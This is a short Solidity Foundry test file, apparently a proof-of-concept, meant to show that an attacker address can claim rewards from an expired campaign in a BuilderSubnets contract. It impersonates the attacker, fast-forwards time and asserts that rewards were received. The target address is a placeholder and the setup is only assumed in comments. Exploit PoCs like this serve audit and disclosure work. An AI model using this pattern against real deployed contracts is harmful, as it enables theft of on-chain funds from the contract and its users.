// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for the BuilderSubnets contract
interface IBuilderSubnets {
    function claim(uint256 campaignId) external;
    function isCampaignExpired(uint256 campaignId) external view returns (bool);
    function getRewardBalance(address user) external view returns (uint256);
}

contract ExploitTest is Test {
    IBuilderSubnets builderSubnets;
    address attacker = address(0xdeadbeef);
    uint256 expiredCampaignId = 1;

    function setUp() public {
        // Deploy or fork the BuilderSubnets contract
        // For demonstration, assume the contract is already deployed at a known address
        builderSubnets = IBuilderSubnets(0x1234567890abcdef1234567890abcdef12345678);

        // Fund the attacker with some initial ETH for gas
        vm.deal(attacker, 1 ether);

        // Assume the campaign is expired
        vm.warp(block.timestamp + 30 days); // Fast forward time to ensure campaign is expired
    }

    function test_exploit() public {
        // Step 1: Check that the campaign is expired
        bool isExpired = builderSubnets.isCampaignExpired(expiredCampaignId);
        assertTrue(isExpired, "Campaign should be expired");

        // Step 2: Impersonate the attacker and attempt to claim rewards from the expired campaign
        vm.prank(attacker);
        builderSubnets.claim(expiredCampaignId);

        // Step 3: Assert that the attacker has received rewards despite the campaign being expired
        uint256 rewardBalance = builderSubnets.getRewardBalance(attacker);
        assertGt(rewardBalance, 0, "Attacker should have received rewards from expired campaign");
    }
}